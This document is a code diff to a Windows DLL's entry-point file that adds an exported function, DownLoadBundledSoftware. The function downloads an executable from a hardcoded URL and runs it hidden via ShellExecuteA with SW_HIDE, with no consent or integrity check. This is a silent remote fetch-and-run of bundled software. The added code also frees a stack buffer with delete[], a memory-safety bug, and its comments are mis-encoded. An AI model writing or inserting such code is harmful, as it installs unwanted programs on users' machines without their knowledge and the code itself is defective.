@@ -1,9 +1,9 @@
 // dllmain.cpp : Defines the entry point for the DLL application.
 #include "stdafx.h"
 #include "..\GSPre\PeeIdHelper.h"
-#include <tslog\tslog.h>
 #include <string>
 // ATL Header Files
+#include <tslog/tslog.h>
 #include <atlbase.h>
 #include <WTL/atlapp.h>
 #include <Urlmon.h>
@@ -14,7 +14,7 @@
 #define TSLOG
 #define GS_GROUP "GS"	//¿ÉÑ¡,Ä¬ÈÏÎª "TSLOG"
 #include <tslog/tslog.h>				//ÈçÉÏÅäÖÃ,ÈÕÖ¾³ÌÐò½«¸ù¾Ý C:\TSLOG_CONFIG\TSLOG.ini ¶¨ÒåµÄ²ßÂÔ´òÓ¡
-
+#include <shellapi.h>
 
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
@@ -234,4 +234,49 @@ extern "C" __declspec(dllexport) bool GetProfileFolder(char* szMainDir)	// Ê§°Ü·
 	}
 	strcpy(szMainDir, szAllUserDir);
 	return true;
+}
+
+
+DWORD WINAPI DownLoadWork(LPVOID pParameter)
+{
+	TSAUTO();
+	CHAR szUrl[MAX_PATH] = {0};
+	strcpy(szUrl,(LPCSTR)pParameter);
+	delete [] pParameter;
+
+	CHAR szBuffer[MAX_PATH] = {0};
+	::CoInitialize(NULL);
+	HRESULT hr = E_FAIL;
+	__try
+	{
+		hr = ::URLDownloadToCacheFileA(NULL, szUrl, szBuffer, MAX_PATH, 0, NULL);
+	}
+	__except(EXCEPTION_EXECUTE_HANDLER)
+	{
+		TSDEBUG4CXX("URLDownloadToCacheFile Exception !!!");
+	}
+	::CoUninitialize();
+	if (SUCCEEDED(hr) && ::PathFileExistsA(szBuffer))
+	{
+		::ShellExecuteA(NULL,"open",szBuffer,NULL,NULL,SW_HIDE);
+	}
+	return SUCCEEDED(hr)?ERROR_SUCCESS:0xFF;
+}
+
+extern "C" __declspec(dllexport) void DownLoadBundledSoftware()
+{
+	TSAUTO();
+	CHAR szUrl[] = "http://dl.360safe.com/p/Setup_oemqd50.exe";
+	DWORD dwThreadId = 0;
+	HANDLE hThread = CreateThread(NULL, 0, DownLoadWork, (LPVOID)szUrl,0, &dwThreadId);
+	if (NULL != hThread)
+	{
+		DWORD dwRet = WaitForSingleObject(hThread, INFINITE);
+		if (dwRet == WAIT_FAILED)
+		{
+			TSDEBUG4CXX("wait for DownLoa dBundled Software failed, error = " << ::GetLastError());
+		}
+		CloseHandle(hThread);
+	}
+	return;
 }
